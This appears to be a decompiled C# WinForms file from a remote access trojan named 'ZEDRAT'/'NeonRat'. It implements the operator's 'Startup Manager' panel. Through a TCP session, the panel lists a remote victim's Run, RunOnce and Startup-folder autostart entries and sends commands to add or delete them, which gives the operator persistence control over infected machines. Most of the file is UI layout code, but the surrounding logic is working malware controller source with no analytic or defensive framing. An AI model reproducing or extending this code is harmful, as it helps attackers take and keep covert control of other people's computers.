using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Sockets;
using ZEDRAT.TCP;
using ZEDRatApp.Forms.Remote_Startup_Dialog;
using ZEDRatApp.ZEDRAT.Module;

namespace NeonRat.Forms
{
	public class Remote_Startup : Form
	{
		public TcpClientSession _tcs;

		public Remote_Startup_Manager _rsm;

		private IContainer components;

		private ListView lstStartupItems;

		private ColumnHeader hName;

		private ColumnHeader hPath;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem addStartupToolStripMenuItem;

		private ToolStripMenuItem removeStartupToolStripMenuItem;

		private MetroSetControlBox metroSetControlBox1;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuSeparator bunifuSeparator2;

		private BunifuSeparator bunifuSeparator1;

		private BunifuSeparator bunifuSeparator3;

		private BunifuSeparator bunifuSeparator4;

		private BunifuLabel bunifuLabel5;

		private BunifuIconButton CloseBtn;

		public Remote_Startup(string FormText, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this.lstStartupItems.ContextMenuStrip = this.contextMenuStrip1;
			this._tcs = tcs;
			this._rsm = new Remote_Startup_Manager(this._tcs);
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Startup.ReleaseCapture();
			Remote_Startup.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void SetLastColumnWidth1()
		{
			this.lstStartupItems.Columns[this.lstStartupItems.Columns.Count - 1].Width = -2;
		}

		private void Remote_Startup_Load(object sender, EventArgs e)
		{
			this.SetLastColumnWidth1();
			this.lstStartupItems.Layout += delegate
			{
				this.SetLastColumnWidth1();
			};
			this.lstStartupItems.View = View.Details;
			this.lstStartupItems.HideSelection = false;
			this.lstStartupItems.OwnerDraw = true;
			this.lstStartupItems.GridLines = false;
			this.lstStartupItems.BackColor = Color.FromArgb(9, 8, 13);
			this.lstStartupItems.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				SolidBrush brush = new SolidBrush(Color.FromArgb(226, 28, 71));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.lstStartupItems.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.lstStartupItems.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.AddGroups();
			this._tcs._Idispatchar.Register(DataType.RemoteStartupType, new Action<TcpClientSession, byte[]>(this._rsm.RemoteStartupExecute));
			this._rsm._FormExecute = new Action<string, object>(UpdateRemoteStartup_Form);
			this._rsm.Remote_Startup_Send("GetStartupItems", Encoding.UTF8.GetBytes(""));
			base.FormClosed += new FormClosedEventHandler(Remote_Startup_FormClosed);
		}

		public void UpdateRemoteStartup_Form(string DateType, object ob)
		{
			foreach (string item in (List<string>)ob)
			{
				if (int.TryParse(item.Substring(0, 1), out var result))
				{
					ListViewItem listViewItem = new ListViewItem(item.Remove(0, 1).Split(new string[1] { "||" }, StringSplitOptions.None))
					{
						Group = this.GetGroup(result),
						Tag = result
					};
					if (listViewItem.Group == null)
					{
						break;
					}
					this.AddAutostartItemToListview(listViewItem);
				}
			}
		}

		private void AddGroups()
		{
			this.lstStartupItems.Groups.Add(new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
			this.lstStartupItems.Groups.Add(new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
			this.lstStartupItems.Groups.Add(new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
			this.lstStartupItems.Groups.Add(new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
			this.lstStartupItems.Groups.Add(new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"));
			this.lstStartupItems.Groups.Add(new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
			this.lstStartupItems.Groups.Add(new ListViewGroup("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
		}

		public void AddAutostartItemToListview(ListViewItem lvi)
		{
			try
			{
				this.lstStartupItems.Invoke((MethodInvoker)delegate
				{
					this.lstStartupItems.Items.Add(lvi);
				});
			}
			catch (InvalidOperationException)
			{
			}
		}

		public ListViewGroup GetGroup(int group)
		{
			ListViewGroup g = null;
			try
			{
				this.lstStartupItems.Invoke((MethodInvoker)delegate
				{
					g = this.lstStartupItems.Groups[group];
				});
			}
			catch (InvalidOperationException)
			{
				return null;
			}
			return g;
		}

		private void addStartupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using frmAddStartup frmAddStartup = new frmAddStartup();
			if (frmAddStartup.ShowDialog() == DialogResult.OK && this._tcs != null)
			{
				this._rsm.Remote_Startup_Send("DoStartupItemAdd", Encoding.UTF8.GetBytes(AutoStartItem.Name + "," + AutoStartItem.Path + "," + AutoStartItem.Type));
				this.lstStartupItems.Items.Clear();
				this._rsm.Remote_Startup_Send("GetStartupItems", Encoding.UTF8.GetBytes(""));
			}
		}

		private void removeStartupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int num = 0;
			foreach (ListViewItem item in this.lstStartupItems.SelectedItems)
			{
				if (this._tcs != null)
				{
					int num2 = this.lstStartupItems.Groups.Cast<ListViewGroup>().TakeWhile((ListViewGroup t) => t != item.Group).Count();
					this._rsm.Remote_Startup_Send("DoStartupItemRemove", Encoding.UTF8.GetBytes(item.Text + "," + item.SubItems[1].Text + "," + num2));
				}
				num++;
			}
			if (num > 0 && this._tcs != null)
			{
				this.lstStartupItems.Items.Clear();
				this._rsm.Remote_Startup_Send("GetStartupItems", Encoding.UTF8.GetBytes(""));
			}
		}

		private void Remote_Startup_FormClosed(object sender, FormClosedEventArgs e)
		{
			this._tcs?._Idispatchar?.Unregister(DataType.RemoteStartupType);
			this._rsm?.destroy();
			this._tcs = null;
			this._rsm = null;
			GC.Collect();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(NeonRat.Forms.Remote_Startup));
			this.lstStartupItems = new System.Windows.Forms.ListView();
			this.hName = new System.Windows.Forms.ColumnHeader();
			this.hPath = new System.Windows.Forms.ColumnHeader();
			this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.addStartupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.removeStartupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.metroSetControlBox1 = new MetroSet_UI.Controls.MetroSetControlBox();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator4 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuSeparator3 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.bunifuLabel5 = new Bunifu.UI.WinForms.BunifuLabel();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.contextMenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.lstStartupItems.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.lstStartupItems.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.lstStartupItems.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.lstStartupItems.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.hName, this.hPath });
			this.lstStartupItems.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.lstStartupItems.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.lstStartupItems.FullRowSelect = true;
			this.lstStartupItems.HideSelection = false;
			this.lstStartupItems.Location = new System.Drawing.Point(12, 50);
			this.lstStartupItems.Name = "lstStartupItems";
			this.lstStartupItems.Size = new System.Drawing.Size(1133, 612);
			this.lstStartupItems.TabIndex = 0;
			this.lstStartupItems.UseCompatibleStateImageBehavior = false;
			this.lstStartupItems.View = System.Windows.Forms.View.Details;
			this.hName.Text = "Name";
			this.hName.Width = 187;
			this.hPath.Text = "Path";
			this.hPath.Width = 700;
			this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.addStartupToolStripMenuItem, this.removeStartupToolStripMenuItem });
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new System.Drawing.Size(153, 48);
			this.addStartupToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.addStartupToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.addStartupToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.addStartupToolStripMenuItem.Name = "addStartupToolStripMenuItem";
			this.addStartupToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
			this.addStartupToolStripMenuItem.Text = "Add entry";
			this.addStartupToolStripMenuItem.Click += new System.EventHandler(addStartupToolStripMenuItem_Click);
			this.removeStartupToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.removeStartupToolStripMenuItem.Font = new System.Drawing.Font("Century Gothic", 9.75f);
			this.removeStartupToolStripMenuItem.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.removeStartupToolStripMenuItem.Name = "removeStartupToolStripMenuItem";
			this.removeStartupToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
			this.removeStartupToolStripMenuItem.Text = "Delete entry";
			this.removeStartupToolStripMenuItem.Click += new System.EventHandler(removeStartupToolStripMenuItem_Click);
			this.metroSetControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.metroSetControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.CloseHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.CloseNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.DisabledForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.IsDerivedStyle = true;
			this.metroSetControlBox1.Location = new System.Drawing.Point(1056, 1);
			this.metroSetControlBox1.MaximizeBox = true;
			this.metroSetControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MaximizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MaximizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.MinimizeBox = true;
			this.metroSetControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.metroSetControlBox1.MinimizeHoverForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.metroSetControlBox1.MinimizeNormalForeColor = System.Drawing.Color.WhiteSmoke;
			this.metroSetControlBox1.Name = "metroSetControlBox1";
			this.metroSetControlBox1.Size = new System.Drawing.Size(100, 25);
			this.metroSetControlBox1.Style = MetroSet_UI.Enums.Style.Custom;
			this.metroSetControlBox1.StyleManager = null;
			this.metroSetControlBox1.TabIndex = 159;
			this.metroSetControlBox1.Text = "metroSetControlBox1";
			this.metroSetControlBox1.ThemeAuthor = "Narwin";
			this.metroSetControlBox1.ThemeName = "MetroLite";
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(0, -8);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(5, 9, 5, 9);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(1157, 16);
			this.bunifuSeparator1.TabIndex = 251;
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(0, 665);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(5, 9, 5, 9);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(1157, 16);
			this.bunifuSeparator2.TabIndex = 252;
			this.bunifuSeparator4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator4.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator4.BackgroundImage");
			this.bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator4.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator4.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator4.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator4.LineThickness = 1;
			this.bunifuSeparator4.Location = new System.Drawing.Point(-5, 1);
			this.bunifuSeparator4.Margin = new System.Windows.Forms.Padding(4, 9, 4, 9);
			this.bunifuSeparator4.Name = "bunifuSeparator4";
			this.bunifuSeparator4.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator4.Size = new System.Drawing.Size(10, 672);
			this.bunifuSeparator4.TabIndex = 253;
			this.bunifuSeparator3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator3.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator3.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator3.BackgroundImage");
			this.bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator3.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator3.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator3.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator3.LineThickness = 1;
			this.bunifuSeparator3.Location = new System.Drawing.Point(1151, 1);
			this.bunifuSeparator3.Margin = new System.Windows.Forms.Padding(4, 9, 4, 9);
			this.bunifuSeparator3.Name = "bunifuSeparator3";
			this.bunifuSeparator3.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator3.Size = new System.Drawing.Size(10, 672);
			this.bunifuSeparator3.TabIndex = 254;
			this.bunifuLabel5.AllowParentOverrides = false;
			this.bunifuLabel5.Anchor = System.Windows.Forms.AnchorStyles.Top;
			this.bunifuLabel5.AutoEllipsis = false;
			this.bunifuLabel5.CursorType = null;
			this.bunifuLabel5.Font = new System.Drawing.Font("Century Gothic", 11.25f);
			this.bunifuLabel5.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuLabel5.Location = new System.Drawing.Point(53, 24);
			this.bunifuLabel5.Name = "bunifuLabel5";
			this.bunifuLabel5.RightToLeft = System.Windows.Forms.RightToLeft.No;
			this.bunifuLabel5.Size = new System.Drawing.Size(53, 20);
			this.bunifuLabel5.TabIndex = 255;
			this.bunifuLabel5.Text = "StartUp";
			this.bunifuLabel5.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
			this.bunifuLabel5.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 9);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 256;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(1157, 674);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.bunifuLabel5);
			base.Controls.Add(this.bunifuSeparator3);
			base.Controls.Add(this.bunifuSeparator4);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add(this.metroSetControlBox1);
			base.Controls.Add(this.lstStartupItems);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_Startup";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Startup Manager";
			base.Load += new System.EventHandler(Remote_Startup_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			this.contextMenuStrip1.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
